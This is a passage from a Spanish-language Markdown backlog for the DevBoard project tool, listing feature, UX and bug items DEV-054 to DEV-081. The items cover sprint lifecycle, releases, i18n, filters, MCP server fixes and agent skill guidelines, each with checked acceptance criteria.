4. **Validaciones:** Prevenir estados huérfanos y asegurar que cada columna conserve un `dropTargetStatus` coherente con sus estados contenidos.

**Criterios de Aceptación:**
- [x] #1 En SettingsView (pestaña Tablero Kanban), los chips de estados son arrastrables entre columnas
- [x] #2 Indicador visual claro del contenedor destino durante el arrastre (hover highlight)
- [x] #3 Al soltar un estado en otra columna, se actualiza la configuración en memoria y se persiste en .devboard/config.json
- [x] #4 Soporte para reconfigurar tanto columnas en modo Simple como en modo Ampliado
- [x] #5 Validación para garantizar que todos los estados esenciales pertenezcan a al menos una columna

---

#### [DEV-054] Rediseño Ergonómico y Expansión del Modal de Crear y Editar Card (Layout de 2 Columnas)
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.2

Rediseño integral de ergonomía y distribución visual en el modal de creación y edición de tarjetas (`ItemModal.tsx`):
1. **Problema de Espacio:** El modal actual es angosto y verticalmente apretado para la alta densidad de información que maneja (criterios de aceptación dinámicos, descripción técnica, plan de implementación, contexto, dependencias y metadatos).
2. **Arquitectura de 2 Columnas (Estilo Linear / GitHub Projects):**
   - **Columna Principal (Izquierda ~65-70%):** Área amplia y despejada dedicada al contenido sustantivo: Título grande, Descripción con soporte enriquecido, Criterios de Aceptación con espacio cómodo de escritura por ítem, y Plan Técnico de Implementación.
   - **Sidebar Lateral de Atributos (Derecha ~30-35%):** Panel lateral estilizado con selectores rápidos y limpios para metadatos: Tipo de Card, Prioridad, Estado, Épica/Padre, Sprints, Release, Enlaces/Dependencias, Etiquetas, Módulo y Archivo Impactado.
3. **Dimensiones:** Ampliar el ancho del modal a `max-w-6xl` en pantallas de escritorio con scrolls independientes para evitar saltos.
4. **Mobile First:** Mantenimiento de la experiencia como bottom-sheet táctil fluido en pantallas pequeñas.

**Criterios de Aceptación:**
- [x] #1 Modal expandido a max-w-6xl en escritorio con distribución moderna de 2 columnas
- [x] #2 Panel principal izquierdo espacioso para título, descripción, criterios de aceptación y plan técnico
- [x] #3 Sidebar lateral derecha compacta y alineada para atributos clave (tipo, prioridad, estado, padre, sprint, release)
- [x] #4 Entradas de criterios de aceptación con altura cómoda y auto-creación fluida
- [x] #5 Adaptación responsive elegante a bottom-sheet en pantallas móviles

---

#### [DEV-055] Ciclo de Vida Integral de Sprints: Objetivo, Fechas con Presets, Estados y Autofiltrado
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Formalización del ciclo de vida y metadatos de los Sprints como entidad ágil de primera clase:
1. **Metadatos Enriquecidos:** Cada Sprint debe contar con:
   - Nombre o identificador (ej: "Sprint 1", "Sprint 2").
   - Descripción / Objetivo del Sprint (Sprint Goal, notas de alcance y acuerdos de la iteración).
   - Fechas de Inicio y Fin con presets rápidos de cálculo automático:
     - 1 semana
     - 2 semanas (estándar común)
     - 3 semanas
     - 4 semanas
     - Personalizado (fechas manuales).
2. **Ciclo de Vida (Estados):** Un sprint transiciona por los estados `planned` (planificado), `active` (en curso) y `completed` (finalizado).
   - Botón "Iniciar Sprint" (con restricción estricta de máximo 1 sprint activo por proyecto).
   - Botón "Completar Sprint" con resumen de cierre.
3. **Autofiltrado en Sprint Board (Scrumban):** Al conmutar a la vista de Tablero de Sprint, el tablero autofiltra su contenido exclusivamente a las tarjetas dentro del alcance del sprint activo.
4. **Orden Cronológico:** Los agrupadores de sprint deben mostrarse predeterminadamente ordenados del más viejo al más nuevo, finalizando siempre en el contenedor "Backlog".

**Criterios de Aceptación:**
- [x] #1 Entidad Sprint estructurada con id, nombre, objetivo/descripción, fechas inicio/fin y estado (planned, active, completed)
- [x] #2 Presets de duración en formulario de sprint (1, 2, 3, 4 semanas y custom) que calculan automáticamente la fecha de fin
- [x] #3 Acciones de 'Iniciar Sprint' (máximo 1 activo a la vez) y 'Completar Sprint'
- [x] #4 En modo Scrumban, el Tablero de Sprint se autofiltra automáticamente al Sprint Activo
- [x] #5 En la vista de Sprints y Priorización, los sprints se ordenan cronológicamente del más viejo al más nuevo, con 'Backlog' al final

---

#### [DEV-056] Releases Multi-Versión y Modelo Unificado de Sprints Jira-Style
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Evolución del modelo de datos para Sprints y Releases en las tarjetas, adoptando un diseño unificado y sin redundancias:
1. **Modelo Unificado de Sprints (Jira-Style):** 
   - Se unifica en un único campo array: `sprints?: string[]`.
   - **Regla de Negocio:** Una tarjeta solo puede tener **1 sprint activo** asignado en curso a la vez.
   - **Historial de Cierres:** Cuando finaliza una iteración asociada a la tarjeta, el sprint permanece guardado en el array `sprints` como registro histórico de sprints finalizados (comportamiento idéntico al estándar de Jira). Se evita la creación de campos paralelos o duplicados como `sprintHistory`.
2. **Releases Multi-Versión:**
   - Una tarjeta puede estar asociada a múltiples versiones a lo largo de su ciclo de vida o en despliegues concurrentes (ej: release de hotfix en `0.2.1` y de release general en `0.3.0`).
   - Se amplía el campo a `releases?: string[]` manteniendo compatibilidad con `release?: string`.
3. **Persistencia Frontmatter:** Almacenamiento limpio en Markdown (`sprints: ['Sprint 1', 'Sprint 2']`, `releases: ['0.2.1', '0.3.0']`).

**Criterios de Aceptación:**
- [x] #1 BacklogItem unifica los sprints en un único campo array 'sprints?: string[]' sin campos paralelos de historial
- [x] #2 Regla de negocio que valida máximo 1 sprint en estado activo asociado a la tarjeta a la vez
- [x] #3 Al completar un sprint, las tarjetas asociadas conservan el sprint finalizado en su lista 'sprints'
- [x] #4 Soporte para asociar múltiples versiones/releases por tarjeta (releases?: string[])
- [x] #5 Sincronización y persistencia transparente en frontmatter Markdown sin pérdida de datos

---

#### [DEV-058] Política de Visualización Limpia en Tablero: Ocultamiento por Defecto de Cards en 'Done' y Toggle de Histórico
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.2

Optimización de la visualización de tareas finalizadas en el tablero Kanban (especialmente en la vista simplificada y en el tablero de sprint goal):
1. **Problema de Acumulación:** En tableros ágiles, acumular decenas de tarjetas históricas cerradas en la columna `Done` no aporta valor operativo al día a día del equipo y satura la pantalla, provocando desorden y lentitud de renderizado.
2. **Ocultamiento por Defecto:**
   - En la vista simplificada y tableros acotados a sprint, ocultar por defecto las tarjetas en `done` que pertenezcan a iteraciones pasadas o finalizadas hace más de un intervalo configurable.
   - Mostrar un indicador limpio y sutil al tope de la columna Done con el conteo de tarjetas históricas archivadas (ej: "+18 tareas completadas anteriormente").
3. **Toggle Bajo Demanda (Estilo Ideas):** Incorporar un botón o selector interactivo (similar al de Ideas) para mostrar u ocultar el histórico de Done cuando el usuario explícitamente desee auditarlo.

**Criterios de Aceptación:**
- [x] #1 En vista simplificada, no acumular tareas finalizadas históricas en la columna Done por defecto
- [x] #2 Indicador visual sutil al tope de la columna con el conteo de tareas completadas ocultas
- [x] #3 Botón interactivo o toggle para revelar el histórico completo de Done bajo demanda
- [x] #4 Persistencia de la preferencia de visualización en Settings (.devboard/config.json)
- [x] #5 Reducción comprobable del número de nodos DOM y mejora en fluidez de render

---

#### [DEV-059] Administración y Personalización de Tipos de Cards y Flujos de Trabajo por el Usuario (Admin Soberano)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Otorgar soberanía total y personalización al usuario/admin para definir y gestionar la taxonomía de tipos de tarjeta y flujos de trabajo de su proyecto:
1. **Soberanía Administrativa:** Aunque DevBoard incluye tipos predeterminados (`feature`, `bug`, `tech_debt`, `ux`, etc.), el usuario es el dueño de su proyecto y flujo. Debe poder crear nuevos tipos personalizados (ej. `spike`, `research`, `design`, `meeting`, `infra`), editar los existentes (nombre, color semántico, icono) o eliminar los que no utilice.
2. **Editor de Tipos en Settings:** Incorporar en `SettingsView` una sección dedicada "Tipos de Tarjeta y Taxonomía" donde se listen los tipos actuales con acciones de edición inline, cambio de paleta cromática, asignación de icono de Lucide y botón "+ Nuevo Tipo".
3. **Integración Universal:** Los nuevos tipos creados deben poblarse automáticamente en los modales de creación y edición (`ItemModal.tsx`), filtros de búsqueda (`FilterBar.tsx`) y badges de las tarjetas (`ItemCard.tsx`).
4. **Persistencia Local:** Almacenamiento directo en `.devboard/config.json` bajo `config.customItemTypes`.

**Criterios de Aceptación:**
- [x] #1 Sección 'Tipos de Tarjeta' en SettingsView con gestión CRUD completa (crear, editar, eliminar)
- [x] #2 Formulario de configuración de tipo: identificador clave, nombre legible, color semántico e icono
- [x] #3 Los tipos personalizados se reflejan automáticamente en los selectores de ItemModal y FilterBar
- [x] #4 Los badges de ItemCard renderizan adecuadamente el color e icono del tipo personalizado
- [x] #5 Persistencia automática y aislada en .devboard/config.json sin romper esquemas preexistentes

---

#### [DEV-060] Internacionalización Total (i18n): Cobertura 100% en Inglés y Español sin Textos Hardcodeados y Selector en Settings
- **Prioridad**: `high` | **Tipo**: `feature`

Infraestructura completa de internacionalización (i18n) para soportar navegación fluida en Español e Inglés con cobertura total de la interfaz:
1. **Cero Textos Hardcodeados:** Extracción sistemática de todos los textos presentes en componentes, cabeceras, botones, badges, modales, tooltips, toasts de feedback, empty states y páginas de ajustes hacia archivos de localización estructurados (`locales/es.json` y `locales/en.json`).
2. **Selector de Idioma en Settings:** Incorporar en `SettingsView` (pestaña General) un selector interactivo para alternar entre Español e Inglés, con persistencia instantánea en la configuración del proyecto (`config.locale`).
3. **Detección Automática:** Detección inicial inteligente basada en las preferencias de idioma del navegador (`navigator.language`), con fallback seguro a Español o Inglés.
4. **Tipado Estricto de Claves:** Provisión de un hook o helper reactivo `useTranslation()` con autocompletado y validación TypeScript de claves de traducción para prevenir claves inexistentes en tiempo de compilación.

**Criterios de Aceptación:**
- [x] #1 Diccionarios de traducción completos para Español (es) e Inglés (en) cubriendo el 100% de los textos en pantalla
- [x] #2 Hook o contexto useTranslation() fuertemente tipado con cambio de idioma reactivo sin recarga de página
- [x] #3 Selector interactivo de idioma en SettingsView con persistencia en .devboard/config.json
- [x] #4 Detección automática inicial del idioma del navegador
- [x] #5 Auditoría estricta de código para validar ausencia de strings de texto visibles hardcodeadas

---

#### [DEV-062] Separación de Versiones en Unreleased (Dev) y Released (Producción) en Release Hub y Modelo de Datos
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Corrección conceptual integral del ciclo de vida de versiones: una versión en desarrollo (staging/dev) es 'unreleased' independientemente de si tiene tareas listas o commits. Solo pasa a 'released' (histórico inmutable) al ser explícitamente promovida/desplegada a producción.

**Criterios de Aceptación:**
- [x] #1 Soporte explícito para status 'unreleased' en Release y migración de v0.3.0 de released a unreleased en releases.json
- [x] #2 vite.config.ts no asigna releasedAt ni fuerza status done salvo que la versión sea explícitamente 'released'
- [x] #3 ReleaseAssembler.tsx divide claramente 'Unreleased / En Preparación' de 'Releases Históricos (Producción)'
- [x] #4 Botón 'Guardar Borrador Unreleased' para actualizar changelog continuo en dev sin sellar histórico
- [x] #5 Modal/Acción deliberada 'Liberar a Producción' que solicita confirmación antes de marcar como 'released' y registrar releasedAt
- [x] #6 MCP server (devboard_list_releases) expone el campo status ('unreleased' | 'released' | 'planned') de cada versión

---

#### [DEV-063] Fix: Estabilidad de Scroll, Tie-Breakers Deterministas y Normalización al Ordenar en Vista Sprint
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.3.0

Corrección del comportamiento de salto vertical, parpadeo y desplazamiento involuntario de la pantalla al ordenar por columnas (especialmente Prioridad) en `SprintView.tsx`:
1. **Comparador Débil y Valores No Normalizados:** Al ordenar por prioridad, si las prioridades coinciden o contienen valores textuales no estándar (`urgent`, `high`, `undefined`), el comparador produce `0` o `NaN`, corrompiendo la estabilidad del ordenamiento y alterando aleatoriamente las alturas de los bloques. Se debe normalizar la prioridad y utilizar un tie-breaker secundario determinista (desempate por `code`).
2. **Preservación de Scroll del Viewport:** Al hacer click en un header de ordenamiento en una tabla ubicada más abajo en la página (ej. Backlog), el reordenamiento de los grupos superiores altera la altura total y el navegador resetea o desplaza bruscamente `window.scrollY`. Se debe anclar o restaurar de forma fluida e instantánea la posición relativa del viewport al cambiar de orden.

**Criterios de Aceptación:**
- [x] #1 Normalizar prioridades y aplicar tie-breaker determinista por código en el ordenamiento por prioridad
- [x] #2 Aplicar tie-breaker determinista por código en el ordenamiento por estado
- [x] #3 Preservar de forma instantánea y fluida la posición de scroll (`window.scrollY`) antes y después del ordenamiento
- [x] #4 Prevenir saltos de layout o scroll anchoring errático en las tablas de SprintView
- [x] #5 Verificación interactiva en navegador confirmando cero saltos de scroll al ordenar

---

#### [DEV-064] Hardening de MCP Server: Sanitización de Prefijo, Cálculo Robusto de IDs Secuenciales y Herramienta devboard_sync_backlog
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.1

Hardening integral del servidor MCP (`scripts/mcp-server.ts` y binario standalone `bin/devboard-mcp.js`):
1. **Sanitización de Prefijos de Proyecto:** Eliminar caracteres no alfanuméricos en `codePrefix` (ej. `dev-board` extraía `"DEV-"`, produciendo dobles guiones `DEV--060`). Limpiar con `.replace(/[^A-Z0-9]/g, '')`.
2. **Cálculo Robusto de IDs Secuenciales:** Reemplazar `tasks.length + 1` por una búsqueda de `max(num) + 1` parseando los códigos existentes mediante regex para evitar colisiones numéricas cuando hay tareas eliminadas o no correlativas.
3. **Herramienta `devboard_sync_backlog`:** Nueva tool JSON-RPC que reconcilia tareas y genera `BACKLOG.md` sin requerir que agentes de IA ejecuten comandos de shell sueltos (`npm run backlog:sync`).

**Criterios de Aceptación:**
- [x] #1 Sanitización de prefijo en mcp-server.ts impidiendo dobles guiones en IDs generados
- [x] #2 Cálculo de nuevo ID basado en max(existentes) + 1 con fallback seguro
- [x] #3 Implementación de tool devboard_sync_backlog en el servidor MCP
- [x] #4 Reconstrucción del binario standalone bin/devboard-mcp.js y validación con scripts/verify-mcp-binary.js

---

#### [DEV-065] Actualización de Skills de Agentes: Guía Estricta Anti-Scripts de Terminal y Ciclo de Vida Unreleased vs Released
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.1

Actualización y enriquecimiento de las Skills del repositorio (`.agents/skills/devboard`, `.agents/skills/rigorous-qa-auditor`, `AGENTS.md`):
1. **Regla Anti-Scripts Sueltos:** Establecer como principio fundamental que los agentes de IA NO deben ejecutar scripts ad-hoc de Node (`node -e ...`) ni comandos bash destructivos (`mv`, `rm` sobre el backlog) cuando operan en DevBoard. Si una operación falta, debe usarse o proponerse una herramienta MCP.
2. **Ciclo de Vida de Releases:** Documentar la distinción canónica entre `unreleased` (paquete activo en desarrollo, mutable, changelog vivo) y `released` (histórico inmutable en producción con `releasedAt`).
3. **Auditoría de Identificadores:** Instrucciones para que el auditor de QA verifique la integridad de prefijos (`DEV-XXX`), evitando duplicidades o formatos corruptos.

**Criterios de Aceptación:**
- [x] #1 Actualizar .agents/skills/devboard/SKILL.md con las reglas anti-scripts y el flujo unreleased vs released
- [x] #2 Actualizar .agents/skills/rigorous-qa-auditor/SKILL.md con guardrails de integridad de IDs
- [x] #3 Reflejar las directivas clave en AGENTS.md

---

#### [DEV-066] Simplificación Conceptual de Releases: Lista Unificada (En Preparación vs Implementado) y Detalle Progresivo
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.1

Refactorización y simplificación radical del modelo y la interfaz de Releases:
1. **Unificación Conceptual:** 'Planning', 'Target' y 'Unreleased' son conceptualmente lo mismo: una versión **En Preparación**. Eliminar la división artificial en bloques separados redundantes.
2. **Modelo Binario Puro:**
   - **En Preparación (Unreleased / Dev):** Trabajo activo, editable, mutable.
   - **Implementado / Entregado (Released / Prod):** Desplegado a producción, histórico e inmutable.
3. **Ergonomía de Lista y Detalle Progresivo:** Presentar las versiones en una lista limpia y concisa (vista compacta / feed simple). Desplegar metadatos extensos, notas de cambio y edición únicamente cuando el usuario selecciona o expande una versión específica.

**Criterios de Aceptación:**
- [x] #1 Unificar los estados del modelo de Release a exclusivamente 'unreleased' y 'released'
- [x] #2 Rediseñar ReleaseAssembler.tsx hacia una vista tipo lista compacta y clara sin divisiones redundantes
- [x] #3 Implementar panel de detalle progresivo (drawer o split-view) para inspección y edición bajo demanda

---

#### [DEV-067] Arquitectura Unificada de Filtros: Filtro General de Estados (Inclusión/Exclusión), Quick Filters y Popover Multiselect
- **Prioridad**: `urgent` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.3

Evolución integral del sistema de filtrado de DevBoard hacia un modelo limpio, escalable y unificado:
1. **Filtro General de Estados (Inclusión / Exclusión):** Unificación de la visibilidad de estados activos (draft, doing, review, ready), tareas completadas (done) y tareas de descarte/cancelación (dismissed, cancelled).
   - Política predeterminada: tareas activas y completadas de la iteración actual incluidas; completadas de iteraciones pasadas y descartadas/canceladas excluidas por defecto.
   - Flexibilidad total: activación bajo demanda para auditar descartadas o consultar completadas históricas sin cambiar de pestaña.
2. **Estrategia Dual de Interfaz:**
   - **Quick Filters en Encabezado:** Acceso inmediato con un clic a búsquedas (⌘K), selector de Sprint Goal, toggles de estado (✓ Completadas anteriores, ✕ Descartadas) y pills rápidas.
   - **Popover de Filtros Avanzados (Filtros ▾ (N)):** Panel desplegable extensible con soporte multiselect para Tipos, Prioridades, Estados, Sprints, Releases y Módulos.
   - **Chips Activos Descartables y Reset:** Visualización de chips con ✕ y botón universal de 'Limpiar filtros'.

**Criterios de Aceptación:**
- [x] #1 Extender FilterState en types.ts para soportar multiselect (types, priorities) y filtro general de estados (includePreviousDone, includeDismissedCancelled)
- [x] #2 Implementar AdvancedFiltersPopover.tsx con interfaz multiselect por categorías y contador de filtros activos
- [x] #3 Actualizar FilterBar.tsx para incorporar el botón desplegable de Filtros y Quick Filters en el encabezado con chips activos
- [x] #4 Actualizar lógica central en App.tsx para procesar la inclusión/exclusión de estados y multiselect
- [x] #5 Refactorizar KanbanBoard.tsx eliminando botones ad-hoc y vinculando la columna Done y las completadas anteriores al filtro unificado
- [x] #6 Verificación con npm run build y sincronización limpia del backlog

---

#### [DEV-068] Fix: devboard_list_tasks - Filtro por Sprint Retorna Todos los Tasks
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.4.0

El filtro `{ "sprint": "Sprint 3" }` en `devboard_list_tasks` no filtra por sprint: retorna todos los tasks del proyecto. Esto genera confusión en auditorías de sprint y obliga al agente a filtrar manualmente el JSON.

**Root cause posible:** El campo `sprint` en el frontmatter Markdown puede estar bajo nombres alternativos (`targetSprint`, `milestone`) que el parser no mapea al filtro `sprint` de la API.

**Fix esperado:** El filtro `sprint` en `devboard_list_tasks` debe matchear los campos `sprint`, `targetSprint`, y el frontmatter `sprint:` del archivo Markdown.

**Criterios de Aceptación:**
- [x] #1 devboard_list_tasks con { sprint: 'Sprint 3' } retorna solo tasks cuyo frontmatter contiene sprint: Sprint 3
- [x] #2 El filtro también matchea el campo targetSprint cuando coincide con el valor buscado
- [x] #3 Test con proyecto dev-board: filtrar por Sprint 3 retorna exactamente DEV-047, DEV-049, DEV-051, DEV-052, DEV-053, DEV-055, DEV-067 y nada más
- [x] #4 Documentar el filtro corregido en el schema MCP
- [x] #5 La corrección es backwards-compatible con el CLI devboard list

---

#### [DEV-069] Fix: devboard_update_task - Ignorar status dentro del objeto updates silenciosamente
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.4.0

Cuando se pasa `{ "taskId": "DEV-001", "updates": { "status": "ready" } }`, el servidor MCP ignora el campo `status` dentro de `updates` sin retornar error. El task mantiene su estado anterior.

Esto genera un bug silencioso muy difícil de detectar: el agente cree que actualizó el status, pero el archivo Markdown no cambia.

**Fix esperado:** El servidor MCP debe aceptar `status` tanto como campo top-level como dentro de `updates`, O retornar un error claro indicando que `status` no es válido dentro de `updates` para evitar la confusión.

**Criterios de Aceptación:**
- [x] #1 devboard_update_task acepta status dentro de updates Y lo aplica correctamente
- [x] #2 O bien: devboard_update_task retorna un warning/error cuando se detecta status dentro de updates (para que el agente pueda corregirlo)
- [x] #3 Documentar claramente en el schema MCP el campo correcto para cambiar status
- [x] #4 Añadir test unitario que valide ambas formas de pasar el status

---

#### [DEV-070] Feature: Retro Automática al Cerrar Sprint - Template y Checklist Integrado
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Implementar soporte nativo para Sprint Retrospectivas en DevBoard.

**Motivación:** Las retros manuales al final de cada sprint son valiosas pero se omiten cuando el sprint se cierra rápidamente. Se necesita un mecanismo que las haga obligatorias y estructuradas.

**Funcionalidad esperada:**
1. Al marcar el último item de un sprint como `ready` o al ejecutar 'Completar Sprint', DevBoard muestra un prompt de retro.
2. El template de retro incluye las 4 dimensiones: Problemas, Eficiencia, Fortalezas, Acciones.
3. Las acciones concretas de la retro se convierten automáticamente en nuevas tareas del backlog.
4. La retro queda guardada como archivo en `backlog/retros/sprint-N-retro.md`.
5. El MCP expone `devboard_create_retro` y `devboard_list_retros`.

**Criterios de Aceptación:**
- [x] #1 Al completar un sprint, CompleteSprintModal incluye paso de retro opcional pero promovido
- [x] #2 Template de retro con secciones: ¿Qué salió bien?, ¿Qué mejorar?, ¿Qué cambiar?, Acciones concretas
- [x] #3 Las acciones se pueden convertir en tasks con un click (Create Task from Action)
- [x] #4 La retro se persiste en backlog/retros/ como archivo Markdown estándar
- [x] #5 devboard_list_retros MCP tool lista las retros guardadas con resumen
- [x] #6 La retro aparece en el timeline de la Release Notes si el sprint tiene release asociado

---

#### [DEV-071] Fix: Aislamiento estricto de Sprints por Proyecto y Prevención de Fugas Cross-Project
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.4.0

En instalaciones multi-proyecto, los sprints registrados en otros proyectos se filtraban hacia el proyecto activo (dev-board), generando agrupadores de sprints vacíos con badge 'Activo' ('Sprint Temático A', 'Performance y Escala', etc.) que no existen en el sprints.json local y no pueden ser eliminados.

**Criterios de Aceptación:**
- [x] #1 Garantizar que readProjectBacklog en backend asigne siempre projectId a cada sprint cargado desde sprints.json
- [x] #2 En App.tsx, derivar projectSprints filtrando boardData.sprints estrictamente por selectedProjectId
- [x] #3 Pasar projectSprints y availableSprints contextuales a SprintView, KanbanBoard y selectores de modal
- [x] #4 En handleDeleteSprint y mutaciones de sprints, enviar el projectId específico del sprint para permitir su eliminación adecuada
- [x] #5 Eliminar la fuga de sprints de proyectos foráneos en la vista Sprint & Priorización

---

#### [DEV-072] Integración de CodeGraph MCP, Codegraph Studio y Guía de Arquitectura de Código
- **Prioridad**: `high` | **Tipo**: `tech_debt`
- **Sprint / Milestone**: 0.4.0

Integración de la extensión CodeGraph MCP (Andrey Gavrilov) y Codegraph Studio en el entorno de desarrollo para agilizar el análisis semántico de código, reducir consumo de tokens y prevenir regresiones antes del Sprint 4. Incluye la documentación canónica de arquitectura y reglas de navegación para agentes.

**Criterios de Aceptación:**
- [x] #1 Configurar el servidor CodeGraph MCP en mcp_config.json apuntando a http://localhost:6010/mcp
- [x] #2 Crear docs/ARCHITECTURE.md con la topología integral del proyecto (Vite backend, Vistas React, Storage y MCP)
- [x] #3 Crear regla en .agents/rules/codebase-navigation.md para guiar la navegación de agentes con CodeGraph y el mapa arquitectónico
- [x] #4 Verificar que los tipos y el build continúen pasando sin regresiones

---

#### [DEV-073] Documentación técnica de CodeGraph MCP y refinamiento de skills de ingeniería
- **Prioridad**: `medium` | **Tipo**: `tech_debt`
- **Sprint / Milestone**: 0.4.0

Refinar la documentación y skills de DevBoard incorporando las herramientas de CodeGraph MCP, sus comandos de consulta semántica, el gotcha de activación del Language Server de TypeScript y la estrategia de fallback con docs/ARCHITECTURE.md.

**Criterios de Aceptación:**
- [x] #1 Documentar el servidor CodeGraph MCP y su gotcha de activación en AGENTS.md
- [x] #2 Actualizar la regla .agents/rules/codebase-navigation.md con el protocolo de fallback inteligente
- [x] #3 Actualizar el skill .agents/skills/principal-engineer/SKILL.md con las directivas de análisis semántico e impacto antes de refactors
- [x] #4 Validar compilación tsc y sincronización de backlog

---

#### [DEV-074] Botón Deshacer Cambios en Settings (Restablecer Estado no Guardado)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Al lado del botón 'Guardar Cambios' en la vista de configuración (`SettingsView.tsx`), agregar un botón 'Deshacer Cambios' que permita descartar la configuración editada en el formulario y restablecer todas las preferencias locales al estado guardado en disco (`config`), evitando guardar modificaciones no deseadas.

**Criterios de Aceptación:**
- [x] #1 Mostrar botón 'Deshacer Cambios' al lado de 'Guardar Cambios' en SettingsView cuando existan modificaciones no guardadas (isDirty)
- [x] #2 Al hacer clic en 'Deshacer Cambios', restablecer inmediatamente todos los estados locales al valor persistido en config
- [x] #3 Deshabilitar u ocultar el botón 'Deshacer Cambios' cuando no haya cambios pendientes (!isDirty)
- [x] #4 Proporcionar feedback visual y toast confirmando el restablecimiento de los ajustes

---

#### [DEV-075] Mostrar/ocultar sprint como columna en SprintView
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.4.0

Permitir que la activación/desactivación de la columna Sprint en el popover de Columnas refleje visualmente la columna en la tabla tanto en agrupamiento por sprint como en otros agrupamientos.

**Criterios de Aceptación:**
- [x] #1 Eliminar el bloqueo condicional groupBy !== 'sprint' para los encabezados y celdas de la columna Sprint en SprintView
- [x] #2 Asegurar que cuando visibleCols incluya 'sprint', la columna Sprint se visualice con su selector/etiqueta interactiva
- [x] #3 Verificar que al desmarcar 'sprint' en el popover de columnas, la columna se oculte adecuadamente
- [x] #4 Validar compilación con tsc --noEmit

---

#### [DEV-076] Sanitización de prefijo y cálculo max+1 al crear ítems en la API web
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.4.0

Corregir POST /api/items en vite.config.ts para sanitizar codePrefix (evitar dobles guiones DEV--) y calcular el correlativo usando max+1 sobre backlog.items y archivos en disco, alineándolo con el MCP server.

**Criterios de Aceptación:**
- [x] #1 Sanitizar codePrefix en data/projects-registry.json (remover guión final) y en vite.config.ts
- [x] #2 Implementar cálculo max+1 sobre tareas existentes y archivos en disco en POST /api/items de vite.config.ts
- [x] #3 Sanitizar generateTaskFilename en scripts/backlogMdParser.ts para prevenir dobles guiones accidentales
- [x] #4 Validar creación de tareas y consistencia con npm run test:backlog y tsc --noEmit

---

#### [DEV-077] Mejora selectores sprints y releases en modal de card
- **Prioridad**: `low` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.5.0

Para el campo sprint el listado de sprint debiera ser con un UX/UI similar a la app / modal, no debiera parecer un listado de autocompletado del navegador sin personalidad. Para el campo release, las sugerencias debieran ser por defecto las versiones creadas y en estado unreleased, ya que si no se acumulan históricamente sin límite. Al completar el campo manualmente esta bien que permita incluir tanto unreleased como released versiones, pero no sugerirlas.

**Criterios de Aceptación:**
- [x] #1 Diseñar un selector/dropdown con estética coherente con la UI de DevBoard para el campo de Sprint en ItemModal
- [x] #2 Filtrar las sugerencias por defecto del campo Release mostrando únicamente versiones en estado unreleased
- [x] #3 Permitir la entrada o selección manual de versiones released si el usuario lo requiere expresamente

---

#### [DEV-078] Separación estricta de Sprint y Estado en columnas filtros y datos
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.4.0

Garantizar la independencia total y estricta entre Sprint y Estado: agregar Estado como columna configurable en SprintView, desacoplar la opción 'Backlog' cambiándola a 'Sin Sprint' en selectores de Sprint, y eliminar etiquetas cruzadas en modales y filtros.

**Criterios de Aceptación:**
- [x] #1 Incluir 'estado' en ALL_OPTIONAL_COLS y en el selector de columnas de SprintView
- [x] #2 Hacer condicional el renderizado de la columna Estado en encabezado y celdas de SprintView según visibleCols.has('estado')
- [x] #3 Reemplazar la opción 'Backlog' por 'Sin Sprint' en el selector de Sprint de SprintView y filtros
- [x] #4 Remover sufijo '(Backlog)' en ItemModal, KanbanBoard y AdvancedFiltersPopover para desacoplar Estado y Sprint
- [x] #5 Verificar compilación limpia con tsc --noEmit

---

#### [DEV-079] mejora en columnas / sumar mas campos
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.5.0

Permitir agregar y ocultar columnas adicionales de tareas en la vista de Sprints y Backlog. Específicamente, incorporar campos estructurados no extensos: Criterios de Aceptación (ACs ratio/progreso), Responsables/Asignados (assignees), Etiquetas (labels) y Épica (epic). Cada columna puede activarse u ocultarse dinámicamente desde el popover de Columnas.

**Criterios de Aceptación:**
- [x] #1 El popover de Columnas permite activar/desactivar Criterios de Aceptación (acProgress), Asignados (assignees), Etiquetas (labels) y Épica (epic).
- [x] #2 Cada nueva columna cuenta con su celda th en el encabezado y su renderizado correspondiente con diseño visual pulido en las filas de tareas.
- [x] #3 Las selecciones de columnas se persisten de forma transparente en localStorage y se sincronizan al modificar opciones.

---

#### [DEV-080] la retro no es del release
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

la retro debe estar asignada al sprint no al release, es un error conceptual

**Criterios de Aceptación:**
- [x] #1 Eliminar la pestaña errónea de Retrospectivas en el Drawer de Releases (`ReleaseAssembler.tsx`), desacoplando conceptualmente la ceremonia de sprint del release.
- [x] #2 Incorporar en `SprintView.tsx` un botón "Ver Retrospectiva" en la cabecera de sprints completados (`status === 'completed'`).
- [x] #3 Diseñar modal para visualizar el acta Markdown de la retrospectiva del sprint completado correspondiente.

---

#### [DEV-081] cambios pendientes apenas al entrar a config
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

